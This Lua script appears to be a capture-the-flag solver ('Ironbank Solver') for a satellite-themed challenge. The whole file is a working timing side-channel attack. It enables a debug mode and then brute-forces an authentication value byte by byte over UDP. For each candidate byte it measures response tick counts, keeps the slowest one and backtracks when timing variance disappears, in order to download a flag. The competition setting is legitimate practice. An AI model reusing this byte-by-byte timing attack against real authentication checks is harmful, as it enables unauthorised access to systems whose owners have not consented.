-- NOTE: Uncomment these to run on Flight hardware
local args = {...}
local udp = select(1  , ... )
local print = select(2, ... )
-- END NOTE

MIN_CHAR = 0
MAX_CHAR = 255

N_TRIALS = 8

SHA_LEN = 16
DATA_LEN = 16

print("Starting Ironbank Solver")

-- NOTE: Uncomment these lines to run on non-flight hardware
--local socket = require("socket")
--local udp = socket.udp()
-- END NOTE

last_response_msg = ""

function to_hex( cur_str )
    hex_str = ""
    for i = 1, #cur_str do
        hex_str = hex_str .. string.format("%02x", string.byte(string.sub(cur_str, i, i)) ) 
    end

    return hex_str
end

function string_rep(str, n)
    local result = ""
    for i = 1, n do
        result = result .. str
    end
    return result
end

function send_cmd( s, id, auth, data )
    local cmd_buffer = string.pack( "b", id )
    local data_buffer = data .. string_rep( "\0", DATA_LEN - #data)
    local auth_buffer = auth .. string_rep( "\0", DATA_LEN - #auth)
    local send_buffer = auth_buffer .. cmd_buffer .. data_buffer
    assert( s:send( send_buffer ) )
end

function recv_msg( s )
    return s:receive( 100 )
end

function trial_byte( s, cur_str, try_char )
    local byte_offset = #cur_str
    local npad = DATA_LEN-byte_offset-1
    npad = math.max( npad, 0 )
    local pad_str = string_rep( string.char( 0xff ), npad )
    local auth_cmd = cur_str .. string.char( try_char ) .. pad_str  

    -- Send the download flag command
    send_cmd( s, 8, auth_cmd, "" )
    --print (auth_cmd)

    local response_msg = recv_msg( s )    
    last_response_msg = response_msg

    if response_msg == nil then
       error( "Socket timed out waiting for respone" ) 
    end

    -- Split string and extract tick count
    local _, sep_idx = string.find( response_msg, ":" )

    if sep_idx == nil then
        error( "Invalid respones message -- missing separator (\":\")" )
    end

    local tick_count = tonumber(string.sub( response_msg, sep_idx+1 ))

    -- print (string.sub( response_msg, 1, sep_idx-1 ))
    if string.sub( response_msg, 1, sep_idx-1 ) == "bad auth took" then
        return false, tick_count
    else
        return true, tick_count
    end
end

function crack_next_byte( s, cur_str, last_avg, last_delta )
    local N_pos = #cur_str
    local cur_total = 0

    highest_speed = 0
    highest_byte = 0
    for char = MIN_CHAR, MAX_CHAR, 1 do
        min_value = 9999999
        -- Having a large enough number for N_TRIALS is very important
        -- The satellite is an embedded system and other "stuff" that might be higher priority than 
        -- iron bank is going on. So we want to do several trials to make sure that at least one of them
        -- is a "clean" measurement
        for k = 1, N_TRIALS, 1 do 

            if #cur_str > 1 then
                repeat
                    try_success, try_tick_count = trial_byte( s, cur_str, char )
                until try_tick_count < ((last_avg + (last_delta*5)))
            else
                try_success, try_tick_count = trial_byte( s, cur_str, char )
            end
            -- try_success, try_tick_count = trial_byte( s, cur_str, char )

            if try_success == true then
                return true, string.char(char), 0
            end

            if try_tick_count < min_value then
                min_value = try_tick_count
            end
        end

        -- The minimum speed for a set of trials on a  specific character guess is the "cleanest" 
        -- attempt with the least amount of interference. This is the one we want to grab to compare to other 
        -- characters.
        cur_speed = min_value

        -- DEBUG PRINT
        -- print ("Min char[" .. string.format("%02x", char) .. "] speed[" .. tostring(cur_speed) .. "]")

        cur_total = cur_total + cur_speed

        if cur_speed > highest_speed then
            -- keep track of the overall slowest character - thats the one we want to use
            highest_speed = cur_speed
            highest_byte = char
        end
    end

    return false, string.char(highest_byte), cur_total/256
end

function begin_auth( s )
    print ("Starting Auth")
    send_cmd( s, 2, "", "cromulans" ) 

    print ("Receiving challenge")
    challenge_response = recv_msg( s )

    print( challenge_response )
end

function enable_debug( s )
    print ("Enabling debug")
    send_cmd( s, 3, "", "" )

    print ("Receiving debug response")
    debug_response = recv_msg( s )

    print ("Debug reply: " .. debug_response )
end

function download_flag( s, auth )
    print ("Downloading flag")
    send_cmd( s, 8, auth, "" )

    print ("Receiving command response" )
    debug_response = recv_msg( s )

    print ("Flag download response: " .. debug_response )

    if debug_response == "ok" then
        return true
    else
        return false
    end
end
    

-- Block for 10 seconds    
udp:settimeout( 10 )

assert(udp:setsockname("*",0))
assert(udp:setpeername("127.0.0.1", 12123))

-- done, tick_count = trial_byte( udp, "test", 30 )

print (done)
print (tick_count)


-- Run solver
enable_debug( udp )
begin_auth( udp )

solved_password = ""

print ("Cracking password one byte at a time... (unlimited retries yay!)")

local last_average = 0
local last_delta = 0
local cur_average = 0

local average_array = {}
local delta_array = {}

for k = 1, N_TRIALS, 1 do
    average_array[k] = 0
    delta_array[k] = 0
end

while #solved_password < SHA_LEN do
    good_guess, next_char, cur_average = crack_next_byte( udp, solved_password, last_average, last_delta )

    if good_guess == true then
        solved_password = solved_password .. next_char
        break
    end

    -- If you guessed wrong on the last byte then all future measurements will be worthless
    -- this logic will detect if there is no discernable differencec between any of the bytes tried
    -- if thats the case then we back track by 1 byte and keep going
    if math.abs(cur_average - last_average) < (last_delta/2) and #solved_password > 1 then
        print ("Insufficient variance, retrying guess!")

        revert_position = #solved_password-1
        solved_password = string.sub( solved_password, 1, revert_position )

        last_average = average_array[revert_position]
        last_delta = delta_array[revert_position]

        print ("Last average " .. tostring(last_average) )
        print ("Last delta " .. tostring(last_delta) )
    else
        
        solved_password = solved_password .. next_char

        print ("Solved thus far: " .. to_hex(solved_password) )
        print ("Current average " .. tostring(cur_average) )

        last_delta = cur_average - last_average
        last_average = cur_average

        average_array[#solved_password] = last_average
        delta_array[#solved_password] = last_delta
    end
end

print ("Fully solved password: " .. to_hex(solved_password) )
print("Finished Ironbank Solver")
